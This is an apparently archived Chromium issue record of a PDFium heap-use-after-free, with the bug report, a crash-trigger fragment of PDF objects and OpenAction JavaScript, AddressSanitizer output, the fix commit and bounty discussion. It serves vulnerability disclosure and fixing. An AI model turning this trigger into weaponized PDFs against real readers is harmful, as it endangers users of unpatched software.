# Heap-use-after-free in CPDF_OCContext::CheckOCGVisible

| Field | Value |
|-------|-------|
| **Issue ID** | [40092911](https://issues.chromium.org/issues/40092911) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Internals>Plugins>PDF |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Reporter** | ch...@gmail.com |
| **Assignee** | ts...@chromium.org |
| **Created** | 2018-10-31 |
| **Bounty** | $3,000.00 |

## Description

**VULNERABILITY DETAILS**

cpdf\_contentmarkitem.h class has below mentioned member.  

UnownedPtr<CPDF\_Dictionary> m\_pPropertiesDict;  

It is possible to create a pdf, where above m\_pPropertiesDict points to value dictionary of a form field.  

So when form field's value is changed this m\_pPropertiesDict object gets deleted. Further use of m\_pPropertiesDict causes a use after free.

## PDF File

This section of PDF file causes this bug.

{{object 4 0}} <<

stream  

(OC)  

/V  

BDC //This content item has property /V  

BT  

/F1 20 Tf  

100 100 Td  

(Test) Tj  

ET  

endstream  

endobj  

{{object 5 0}} <<  

/Properties 6 0 R // Properties property points to form fields dictionary.  

// So pdf content item's property /V will be retrieved from form fields dictionary.  

/Font <<F1 7 0 R>>

endobj  

{{object 6 0}} <<  

/FT /Tx  

/Type /Annot  

/Subtype /Widget  

/T (txt1)  

/F 4  

/Rect [200 200 400 400]  

/V <</A (b)>>

JavaScript in OpenAction section of PDF file  

**-------------------------** --------------------  

function run()  

{  

this.getField('txt1').value='a';  

}  

app.setTimeOut('run()',3000);

**VERSION**  

Chrome Version: [70.0.3538.67] + [stable]  

Operating System: [Ubuntu 16.04, Windows 10]

**REPRODUCTION CASE**

1. Save test.pdf file and test.html to same location.
2. Open test.html with chrome.
3. Wait 20 seconds. (20 seconds timeout is added to provide enough time for pdf file to load and perform its' Open Action.).  
   
   PDF plugin process will crash.

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: [PDF Plugin process]  

Crash State: [Address Sanitizer output]

==1==ERROR: AddressSanitizer: heap-use-after-free on address 0x6060000899e8 at pc 0x5618d087a0b3 bp 0x7fff4d2ea070 sp 0x7fff4d2ea068  

READ of size 8 at 0x6060000899e8 thread T0 (chrome)  

#0 0x5618d087a0b2 in std::\_\_1::\_\_tree<std::\_\_1::\_\_value\_type<fxcrt::ByteString, std::\_\_1::unique\_ptr<CPDF\_Object, std::\_\_1::default\_delete<CPDF\_Object> > >, std::\_\_1::\_\_map\_value\_compare<fxcrt::ByteString, std::\_\_1::\_\_value\_type<fxcrt::ByteString, std::\_\_1::unique\_ptr<CPDF\_Object, std::\_\_1::default\_delete<CPDF\_Object> > >, std::\_\_1::less[fxcrt::ByteString](javascript:void(0);), true>, std::\_\_1::allocator<std::\_\_1::\_\_value\_type<fxcrt::ByteString, std::\_\_1::unique\_ptr<CPDF\_Object, std::\_\_1::default\_delete<CPDF\_Object> > > > >::\_\_root() const /home/chamal/chromium/src/out/asan/../../buildtools/third\_party/libc++/trunk/include/\_\_tree:1092:59  

#1 0x5618d087a0b2 in std::\_\_1::\_\_tree\_const\_iterator<std::\_\_1::\_\_value\_type<fxcrt::ByteString, std::\_\_1::unique\_ptr<CPDF\_Object, std::\_\_1::default\_delete<CPDF\_Object> > >, std::\_\_1::\_\_tree\_node<std::\_\_1::\_\_value\_type<fxcrt::ByteString, std::\_\_1::unique\_ptr<CPDF\_Object, std::\_\_1::default\_delete<CPDF\_Object> > >, void\*>\*, long> std::\_\_1::\_\_tree<std::\_\_1::\_\_value\_type<fxcrt::ByteString, std::\_\_1::unique\_ptr<CPDF\_Object, std::\_\_1::default\_delete<CPDF\_Object> > >, std::\_\_1::\_\_map\_value\_compare<fxcrt::ByteString, std::\_\_1::\_\_value\_type<fxcrt::ByteString, std::\_\_1::unique\_ptr<CPDF\_Object, std::\_\_1::default\_delete<CPDF\_Object> > >, std::\_\_1::less[fxcrt::ByteString](javascript:void(0);), true>, std::\_\_1::allocator<std::\_\_1::\_\_value\_type<fxcrt::ByteString, std::\_\_1::unique\_ptr<CPDF\_Object, std::\_\_1::default\_delete<CPDF\_Object> > > > >::find[fxcrt::ByteString](javascript:void(0);)(fxcrt::ByteString const&) const /home/chamal/chromium/src/out/asan/../../buildtools/third\_party/libc++/trunk/include/\_\_tree:2574:0  

#2 0x5618d086e145 in std::\_\_1::map<fxcrt::ByteString, std::\_\_1::unique\_ptr<CPDF\_Object, std::\_\_1::default\_delete<CPDF\_Object> >, std::\_\_1::less[fxcrt::ByteString](javascript:void(0);), std::\_\_1::allocator<std::\_\_1::pair<fxcrt::ByteString const, std::\_\_1::unique\_ptr<CPDF\_Object, std::**1::default\_delete<CPDF\_Object> > > > >::find(fxcrt::ByteString const&) const /home/chamal/chromium/src/out/asan/../../buildtools/third\_party/libc++/trunk/include/map:1313:68  

#3 0x5618d086e145 in CPDF\_Dictionary::GetObjectFor(fxcrt::ByteString const&) const /home/chamal/chromium/src/out/asan/../../third\_party/pdfium/core/fpdfapi/parser/cpdf\_dictionary.cpp:87:0  

#4 0x5618d086ea1e in CPDF\_Dictionary::GetStringFor(fxcrt::ByteString const&, fxcrt::ByteString const&) const /home/chamal/chromium/src/out/asan/../../third\_party/pdfium/core/fpdfapi/parser/cpdf\_dictionary.cpp:121:26  

#5 0x5618d04c126e in CPDF\_OCContext::CheckOCGVisible(CPDF\_Dictionary const\*) /home/chamal/chromium/src/out/asan/../../third\_party/pdfium/core/fpdfdoc/cpdf\_occontext.cpp:283:33  

#6 0x5618d04c1054 in CPDF\_OCContext::CheckObjectVisible(CPDF\_PageObject const\*) /home/chamal/chromium/src/out/asan/../../third\_party/pdfium/core/fpdfdoc/cpdf\_occontext.cpp:189:10  

#7 0x5618d0f68a40 in CPDF\_RenderStatus::ContinueSingleObject(CPDF\_PageObject\*, CFX\_Matrix const&, PauseIndicatorIface\*) /home/chamal/chromium/src/out/asan/../../third\_party/pdfium/core/fpdfapi/render/cpdf\_renderstatus.cpp:1099:34  

#8 0x5618d0f59fb1 in CPDF\_ProgressiveRenderer::Continue(PauseIndicatorIface\*) /home/chamal/chromium/src/out/asan/../../third\_party/pdfium/core/fpdfapi/render/cpdf\_progressiverenderer.cpp:95:30  

#9 0x5618d0f57e63 in CPDF\_ProgressiveRenderer::Start(PauseIndicatorIface\*) /home/chamal/chromium/src/out/asan/../../third\_party/pdfium/core/fpdfapi/render/cpdf\_progressiverenderer.cpp:44:3  

#10 0x5618e3076a76 in (anonymous namespace)::RenderPageImpl(CPDF\_PageRenderContext\*, CPDF\_Page\*, CFX\_Matrix const&, FX\_RECT const&, int, bool, IPDFSDK\_PauseAdapter\*) /home/chamal/chromium/src/out/asan/../../third\_party/pdfium/fpdfsdk/fpdf\_view.cpp:132:26  

#11 0x5618e30730fa in RenderPageWithContext(CPDF\_PageRenderContext\*, fpdf\_page\_t**\*, int, int, int, int, int, int, bool, IPDFSDK\_PauseAdapter\*) /home/chamal/chromium/src/out/asan/../../third\_party/pdfium/fpdfsdk/fpdf\_view.cpp:917:3  

#12 0x5618e305d642 in FPDF\_RenderPageBitmap\_Start /home/chamal/chromium/src/out/asan/../../third\_party/pdfium/fpdfsdk/fpdf\_progressive.cpp:60:3  

#13 0x5618e2ee09f2 in chrome\_pdf::PDFiumEngine::ContinuePaint(int, pp::ImageData\*) /home/chamal/chromium/src/out/asan/../../pdf/pdfium/pdfium\_engine.cc:2999:10  

#14 0x5618e2ede488 in chrome\_pdf::PDFiumEngine::Paint(pp::Rect const&, pp::ImageData\*, std::\_\_1::vector<pp::Rect, std::\_\_1::allocator[pp::Rect](javascript:void(0);) >\*, std::\_\_1::vector<pp::Rect, std::\_\_1::allocator[pp::Rect](javascript:void(0);) >\*) /home/chamal/chromium/src/out/asan/../../pdf/pdfium/pdfium\_engine.cc:837:11  

#15 0x5618e2e712e8 in chrome\_pdf::OutOfProcessInstance::OnPaint(std::\_\_1::vector<pp::Rect, std::\_\_1::allocator[pp::Rect](javascript:void(0);) > const&, std::\_\_1::vector<PaintManager::ReadyRect, std::\_\_1::allocator[PaintManager::ReadyRect](javascript:void(0);) >\*, std::\_\_1::vector<pp::Rect, std::\_\_1::allocator[pp::Rect](javascript:void(0);) >\*) /home/chamal/chromium/src/out/asan/../../pdf/out\_of\_process\_instance.cc:1221:16  

#16 0x5618e2ea7fca in PaintManager::DoPaint() /home/chamal/chromium/src/out/asan/../../pdf/paint\_manager.cc:235:12  

#17 0x5618e2ea6b97 in PaintManager::OnManualCallbackComplete(int) /home/chamal/chromium/src/out/asan/../../pdf/paint\_manager.cc:345:5  

#18 0x5618e2eaf5c4 in pp::CompletionCallbackFactory<PaintManager, pp::ThreadSafeThreadTraits>::Dispatcher0<void (PaintManager::\*)(int)>::operator()(PaintManager\*, int) /home/chamal/chromium/src/out/asan/../../ppapi/utility/completion\_callback\_factory.h:607:9  

#19 0x5618e2eaf337 in pp::CompletionCallbackFactory<PaintManager, pp::ThreadSafeThreadTraits>::CallbackData<pp::CompletionCallbackFactory<PaintManager, pp::ThreadSafeThreadTraits>::Dispatcher0<void (PaintManager::\*)(int)> >::Thunk(void\*, int) /home/chamal/chromium/src/out/asan/../../ppapi/utility/completion\_callback\_factory.h:584:7  

....

0x6060000899e8 is located 40 bytes inside of 56-byte region [0x6060000899c0,0x6060000899f8)  

freed by thread T0 (chrome) here:  

#0 0x5618c936b2e2 in operator delete(void\*) *asan\_rtl*:3  

#1 0x5618d086abf1 in CPDF\_Dictionary::~CPDF\_Dictionary() /home/chamal/chromium/src/out/asan/../../third\_party/pdfium/core/fpdfapi/parser/cpdf\_dictionary.cpp:32:37  

#2 0x5618d0870cd4 in std::\_\_1::default\_delete<CPDF\_Object>::operator()(CPDF\_Object\*) const /home/chamal/chromium/src/out/asan/../../buildtools/third\_party/libc++/trunk/include/memory:2325:5  

#3 0x5618d0870cd4 in std::\_\_1::unique\_ptr<CPDF\_Object, std::\_\_1::default\_delete<CPDF\_Object> >::reset(CPDF\_Object\*) /home/chamal/chromium/src/out/asan/../../buildtools/third\_party/libc++/trunk/include/memory:2638:0  

#4 0x5618d0870cd4 in std::\_\_1::unique\_ptr<CPDF\_Object, std::\_\_1::default\_delete<CPDF\_Object> >::operator=(std::\_\_1::unique\_ptr<CPDF\_Object, std::\_\_1::default\_delete<CPDF\_Object> >&&) /home/chamal/chromium/src/out/asan/../../buildtools/third\_party/libc++/trunk/include/memory:2504:0  

#5 0x5618d0870cd4 in CPDF\_Dictionary::SetFor(fxcrt::ByteString const&, std::\_\_1::unique\_ptr<CPDF\_Object, std::\_\_1::default\_delete<CPDF\_Object> >) /home/chamal/chromium/src/out/asan/../../third\_party/pdfium/core/fpdfapi/parser/cpdf\_dictionary.cpp:216:0  

#6 0x5618d046888f in std::\_\_1::enable\_if<CanInternStrings<CPDF\_String>::value, CPDF\_String\*>::type CPDF\_Dictionary::SetNewFor<CPDF\_String, fxcrt::ByteString&, bool>(fxcrt::ByteString const&, fxcrt::ByteString&, bool&&) /home/chamal/chromium/src/out/asan/../../third\_party/pdfium/core/fpdfapi/parser/cpdf\_dictionary.h:93:28  

#7 0x5618d04630ae in CPDF\_FormField::SetValue(fxcrt::WideString const&, bool, NotificationOption) /home/chamal/chromium/src/out/asan/../../third\_party/pdfium/core/fpdfdoc/cpdf\_formfield.cpp:384:18  

#8 0x5618d0463fa6 in CPDF\_FormField::SetValue(fxcrt::WideString const&, NotificationOption) /home/chamal/chromium/src/out/asan/../../third\_party/pdfium/core/fpdfdoc/cpdf\_formfield.cpp:427:10  

#9 0x5618d12d5092 in (anonymous namespace)::SetValue(CPDFSDK\_FormFillEnvironment\*, fxcrt::WideString const&, int, std::\_\_1::vector<fxcrt::WideString, std::\_\_1::allocator[fxcrt::WideString](javascript:void(0);) > const&) /home/chamal/chromium/src/out/asan/../../third\_party/pdfium/fxjs/cjs\_field.cpp:425:23  

#10 0x5618d12d3710 in CJS\_Field::set\_value(CJS\_Runtime\*, v8::Local[v8::Value](javascript:void(0);)) /home/chamal/chromium/src/out/asan/../../third\_party/pdfium/fxjs/cjs\_field.cpp:2146:5  

#11 0x5618d132f3e3 in void JSPropSetter<CJS\_Field, &(CJS\_Field::set\_value(CJS\_Runtime\*, v8::Local[v8::Value](javascript:void(0);)))>(char const\*, char const\*, v8::Local[v8::String](javascript:void(0);), v8::Local[v8::Value](javascript:void(0);), v8::PropertyCallbackInfo<void> const&) /home/chamal/chromium/src/out/asan/../../third\_party/pdfium/fxjs/js\_define.h:114:23  

#12 0x5618d12f4c80 in CJS\_Field::set\_value\_static(v8::Local[v8::String](javascript:void(0);), v8::Local[v8::Value](javascript:void(0);), v8::PropertyCallbackInfo<void> const&) /home/chamal/chromium/src/out/asan/../../third\_party/pdfium/fxjs/cjs\_field.h:93:3  

....

previously allocated by thread T0 (chrome) here:  

#0 0x5618c936a6a2 in operator new(unsigned long) *asan\_rtl*:3  

#1 0x5618d048eedf in pdfium::internal::MakeUniqueResult<CPDF\_Dictionary>::Scalar pdfium::MakeUnique<CPDF\_Dictionary, fxcrt::WeakPtr<fxcrt::StringPoolTemplate[fxcrt::ByteString](javascript:void(0);), std::\_\_1::default\_delete<fxcrt::StringPoolTemplate[fxcrt::ByteString](javascript:void(0);) > >&>(fxcrt::WeakPtr<fxcrt::StringPoolTemplate[fxcrt::ByteString](javascript:void(0);), std::\_\_1::default\_delete<fxcrt::StringPoolTemplate[fxcrt::ByteString](javascript:void(0);) > >&) /home/chamal/chromium/src/out/asan/../../third\_party/pdfium/third\_party/base/ptr\_util.h:56:29  

#2 0x5618d097c2da in CPDF\_SyntaxParser::GetObjectBodyInternal(CPDF\_IndirectObjectHolder\*, CPDF\_SyntaxParser::ParseType) /home/chamal/chromium/src/out/asan/../../third\_party/pdfium/core/fpdfapi/parser/cpdf\_syntax\_parser.cpp:481:9  

#3 0x5618d097c686 in CPDF\_SyntaxParser::GetObjectBodyInternal(CPDF\_IndirectObjectHolder\*, CPDF\_SyntaxParser::ParseType) /home/chamal/chromium/src/out/asan/../../third\_party/pdfium/core/fpdfapi/parser/cpdf\_syntax\_parser.cpp:503:11  

#4 0x5618d098131f in CPDF\_SyntaxParser::GetIndirectObject(CPDF\_IndirectObjectHolder\*, CPDF\_SyntaxParser::ParseType) /home/chamal/chromium/src/out/asan/../../third\_party/pdfium/core/fpdfapi/parser/cpdf\_syntax\_parser.cpp:556:7  

#5 0x5618d0927f99 in CPDF\_Parser::ParseIndirectObjectAt(long, unsigned int) /home/chamal/chromium/src/out/asan/../../third\_party/pdfium/core/fpdfapi/parser/cpdf\_parser.cpp:921:28  

#6 0x5618d092a434 in CPDF\_Parser::ParseIndirectObject(unsigned int) /home/chamal/chromium/src/out/asan/../../third\_party/pdfium/core/fpdfapi/parser/cpdf\_parser.cpp:870:12  

#7 0x5618d088032e in CPDF\_Document::ParseIndirectObject(unsigned int) /home/chamal/chromium/src/out/asan/../../third\_party/pdfium/core/fpdfapi/parser/cpdf\_document.cpp:195:33  

#8 0x5618d08c4a16 in CPDF\_IndirectObjectHolder::GetOrParseIndirectObject(unsigned int) /home/chamal/chromium/src/out/asan/../../third\_party/pdfium/core/fpdfapi/parser/cpdf\_indirect\_object\_holder.cpp:50:42  

#9 0x5618d094e1e1 in CPDF\_Reference::GetDirect() const /home/chamal/chromium/src/out/asan/../../third\_party/pdfium/core/fpdfapi/parser/cpdf\_reference.cpp:98:35  

#10 0x5618d086e7fd in CPDF\_Dictionary::GetDirectObjectFor(fxcrt::ByteString const&) const /home/chamal/chromium/src/out/asan/../../third\_party/pdfium/core/fpdfapi/parser/cpdf\_dictionary.cpp:99:17  

#11 0x5618d086ed9c in CPDF\_Dictionary::GetDictFor(fxcrt::ByteString const&) const /home/chamal/chromium/src/out/asan/../../third\_party/pdfium/core/fpdfapi/parser/cpdf\_dictionary.cpp:148:26  

#12 0x5618d086ef3c in CPDF\_Dictionary::GetDictFor(fxcrt::ByteString const&) /home/chamal/chromium/src/out/asan/../../third\_party/pdfium/core/fpdfapi/parser/cpdf\_dictionary.cpp:160:50  

#13 0x5618d0e9e41b in CPDF\_StreamContentParser::FindResourceObj(fxcrt::ByteString const&, fxcrt::ByteString const&) /home/chamal/chromium/src/out/asan/../../third\_party/pdfium/core/fpdfapi/page/cpdf\_streamcontentparser.cpp:1146:42  

#14 0x5618d0e8884b in CPDF\_StreamContentParser::Handle\_BeginMarkedContent\_Dictionary() /home/chamal/chromium/src/out/asan/../../third\_party/pdfium/core/fpdfapi/page/cpdf\_streamcontentparser.cpp:603:17  

#15 0x5618d0e9af7b in CPDF\_StreamContentParser::OnOperator(fxcrt::StringViewTemplate<char> const&) /home/chamal/chromium/src/out/asan/../../third\_party/pdfium/core/fpdfapi/page/cpdf\_streamcontentparser.cpp:572:5  

#16 0x5618d0eac196 in CPDF\_StreamContentParser::Parse(unsigned char const\*, unsigned int, unsigned int, unsigned int, std::\_\_1::vector<unsigned int, std::\_\_1::allocator<unsigned int> > const&) /home/chamal/chromium/src/out/asan/../../third\_party/pdfium/core/fpdfapi/page/cpdf\_streamcontentparser.cpp:1533:9  

#17 0x5618d0dae6e7 in CPDF\_ContentParser::Parse() /home/chamal/chromium/src/out/asan/../../third\_party/pdfium/core/fpdfapi/page/cpdf\_contentparser.cpp:211:33  

#18 0x5618d0daa776 in CPDF\_ContentParser::Continue(PauseIndicatorIface\*) /home/chamal/chromium/src/out/asan/../../third\_party/pdfium/core/fpdfapi/page/cpdf\_contentparser.cpp:133:22  

#19 0x5618d0e320ce in CPDF\_PageObjectHolder::ContinueParse(PauseIndicatorIface\*) /home/chamal/chromium/src/out/asan/../../third\_party/pdfium/core/fpdfapi/page/cpdf\_pageobjectholder.cpp:60:18  

#20 0x5618d0e2d945 in CPDF\_Page::ParseContent() /home/chamal/chromium/src/out/asan/../../third\_party/pdfium/core/fpdfapi/page/cpdf\_page.cpp:110:3  

#21 0x5618e30720ff in FPDF\_LoadPage /home/chamal/chromium/src/out/asan/../../third\_party/pdfium/fpdfsdk/fpdf\_view.cpp:351:10  

#22 0x5618e2fcf475 in chrome\_pdf::PDFiumPage::GetPage() /home/chamal/chromium/src/out/asan/../../pdf/pdfium/pdfium\_page.cc:129:17  

#23 0x5618e2fd9aca in chrome\_pdf::PDFiumPage::GetPageFeatures() /home/chamal/chromium/src/out/asan/../../pdf/pdfium/pdfium\_page.cc:574:20  

#24 0x5618e2ed99f1 in chrome\_pdf::PDFiumEngine::CalculateVisiblePages() /home/chamal/chromium/src/out/asan/../../pdf/pdfium/pdfium\_engine.cc:2871:55  

#25 0x5618e2ed6c22 in chrome\_pdf::PDFiumEngine::PluginSizeUpdated(pp::Size const&) /home/chamal/chromium/src/out/asan/../../pdf/pdfium/pdfium\_engine.cc:753:3  

#26 0x5618e2e674d6 in chrome\_pdf::OutOfProcessInstance::OnGeometryChanged(double, float) /home/chamal/chromium/src/out/asan/../../pdf/out\_of\_process\_instance.cc:1901:12  

#27 0x5618e2e77c33 in chrome\_pdf::OutOfProcessInstance::DocumentSizeUpdated(pp::Size const&) /home/chamal/chromium/src/out/asan/../../pdf/out\_of\_process\_instance.cc:1346:3  

#28 0x5618e2eebda2 in chrome\_pdf::PDFiumEngine::LoadPageInfo(bool) /home/chamal/chromium/src/out/asan/../../pdf/pdfium/pdfium\_engine.cc:2791:14  

#29 0x5618e2f2d902 in chrome\_pdf::PDFiumEngine::LoadPages() /home/chamal/chromium/src/out/asan/../../pdf/pdfium/pdfium\_engine.cc:2819:5

**CREDIT INFORMATION**  

Reporter credit: [Anonymous]

## Attachments

- [test.pdf](attachments/test.pdf) (application/pdf, 1.2 KB)
- [test.html](attachments/test.html) (text/plain, 165 B)

## Timeline

### pa...@chromium.org (2018-10-31)

tsepez, can you please pick this one up?

[Monorail components: Internals>Plugins>PDF]

### ts...@chromium.org (2018-10-31)

Repro'd.

### sh...@chromium.org (2018-11-01)

[Empty comment from Monorail migration]

### bu...@chromium.org (2018-11-01)

The following revision refers to this bug:
  https://pdfium.googlesource.com/pdfium/+/9cdf613ce26b3bcdc566ae2f50ddb91ed9061836

commit 9cdf613ce26b3bcdc566ae2f50ddb91ed9061836
Author: Tom Sepez <tsepez@chromium.org>
Date: Thu Nov 01 16:57:27 2018

Make CPDF_ContentMarkItem stop caching the properties dict.

It could be aliased with some other dictionary in the file. We
note that the dictionary one level up will always be an indirect
object in the sharing case, and indirect objects are persisted
by the IndirectObjectHolder, so hold a pointer to that and retrieve
the specific property_name field on the fly.

Bug: chromium:900552
Change-Id: I2e300020d6a7191648dd139a485b6d284e259976
Reviewed-on: https://pdfium-review.googlesource.com/c/44970
Commit-Queue: Tom Sepez <tsepez@chromium.org>
Reviewed-by: Lei Zhang <thestig@chromium.org>

[modify] https://crrev.com/9cdf613ce26b3bcdc566ae2f50ddb91ed9061836/core/fpdfapi/page/cpdf_contentmarkitem.h
[modify] https://crrev.com/9cdf613ce26b3bcdc566ae2f50ddb91ed9061836/core/fpdfapi/page/cpdf_contentmarks.cpp
[modify] https://crrev.com/9cdf613ce26b3bcdc566ae2f50ddb91ed9061836/core/fpdfapi/page/cpdf_streamcontentparser.cpp
[add] https://crrev.com/9cdf613ce26b3bcdc566ae2f50ddb91ed9061836/testing/resources/bug_900552.pdf
[modify] https://crrev.com/9cdf613ce26b3bcdc566ae2f50ddb91ed9061836/core/fpdfapi/page/cpdf_contentmarks.h
[modify] https://crrev.com/9cdf613ce26b3bcdc566ae2f50ddb91ed9061836/core/fpdfapi/page/cpdf_streamcontentparser.h
[add] https://crrev.com/9cdf613ce26b3bcdc566ae2f50ddb91ed9061836/testing/resources/bug_900552.in
[modify] https://crrev.com/9cdf613ce26b3bcdc566ae2f50ddb91ed9061836/core/fpdfapi/page/cpdf_contentmarkitem.cpp
[modify] https://crrev.com/9cdf613ce26b3bcdc566ae2f50ddb91ed9061836/fpdfsdk/fpdf_formfill_embeddertest.cpp


### bu...@chromium.org (2018-11-01)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/02cff454e822c3abb7b04566f7ab9e08d264b3fa

commit 02cff454e822c3abb7b04566f7ab9e08d264b3fa
Author: chromium-autoroll <chromium-autoroll@skia-public.iam.gserviceaccount.com>
Date: Thu Nov 01 18:38:19 2018

Roll src/third_party/pdfium ab688385cfbd..a69842065243 (5 commits)

https://pdfium.googlesource.com/pdfium.git/+log/ab688385cfbd..a69842065243


git log ab688385cfbd..a69842065243 --date=short --no-merges --format='%ad %ae %s'
2018-11-01 thestig@chromium.org Update third_party/yasm/BUILD.gn.
2018-11-01 thestig@chromium.org Roll third_party/skia/ edc6ea7a9..b98fb5b08 (131 commits; 1 trivial rolls)
2018-11-01 thestig@chromium.org Roll third_party/skia/ ffbcc3fad..edc6ea7a9 (1 commit)
2018-11-01 tsepez@chromium.org Make CPDF_ContentMarkItem stop caching the properties dict.
2018-11-01 tsepez@chromium.org Remove notion of file writing from CFX_GlobalData


Created with:
  gclient setdep -r src/third_party/pdfium@a69842065243

The AutoRoll server is located here: https://autoroll.skia.org/r/pdfium-autoroll

Documentation for the AutoRoller is here:
https://skia.googlesource.com/buildbot/+/master/autoroll/README.md

If the roll is causing failures, please contact the current sheriff, who should
be CC'd on the roll, and stop the roller if necessary.



BUG=chromium:900552
TBR=dsinclair@chromium.org

Change-Id: Iaa3e70c669163835e43a0ca57563cd4406d90b3d
Reviewed-on: https://chromium-review.googlesource.com/c/1313032
Reviewed-by: chromium-autoroll <chromium-autoroll@skia-public.iam.gserviceaccount.com>
Commit-Queue: chromium-autoroll <chromium-autoroll@skia-public.iam.gserviceaccount.com>
Cr-Commit-Position: refs/heads/master@{#604650}
[modify] https://crrev.com/02cff454e822c3abb7b04566f7ab9e08d264b3fa/DEPS


### ts...@chromium.org (2018-11-05)

[Empty comment from Monorail migration]

### sh...@chromium.org (2018-11-06)

[Empty comment from Monorail migration]

### sh...@chromium.org (2018-11-08)

[Empty comment from Monorail migration]

### sh...@chromium.org (2018-11-08)

This bug requires manual review: DEPS changes referenced in bugdroid comments.
Please contact the milestone owner if you have questions.
Owners: benmason@(Android), kariahda@(iOS), kbleicher@(ChromeOS), govind@(Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### go...@chromium.org (2018-11-08)

+awhalley@ (Security TPM) for M71 merge review.

### aw...@google.com (2018-11-08)

@govind - good for 71

### go...@chromium.org (2018-11-08)

Approving merge to M71 branch 3578 based on https://crbug.com/chromium/900552#c11. Please merge ASAP. Thank you.

### ts...@chromium.org (2018-11-08)

Merge conflict; If we are taking the fix to https://bugs.chromium.org/p/chromium/issues/detail?id=901654 that will cover this case as well even without this patch.

### aw...@google.com (2018-11-08)

Thanks tsepez@ - I'll move the merge request over to that bug.

### aw...@chromium.org (2018-11-12)

[Empty comment from Monorail migration]

### aw...@google.com (2018-11-28)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-12-03)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.
*********************************

### aw...@google.com (2018-12-03)

Thanks chamal.desilva@! The VRP panel decided to award $3,000 for this report. Thanks as ever!

### aw...@google.com (2018-12-03)

[Empty comment from Monorail migration]

### aw...@google.com (2019-01-28)

[Empty comment from Monorail migration]

### aw...@chromium.org (2019-01-28)

[Empty comment from Monorail migration]

### sh...@chromium.org (2019-02-12)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### aw...@chromium.org (2019-02-19)

[Empty comment from Monorail migration]

### is...@google.com (2019-02-19)

This issue was migrated from crbug.com/chromium/900552?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40092911)*
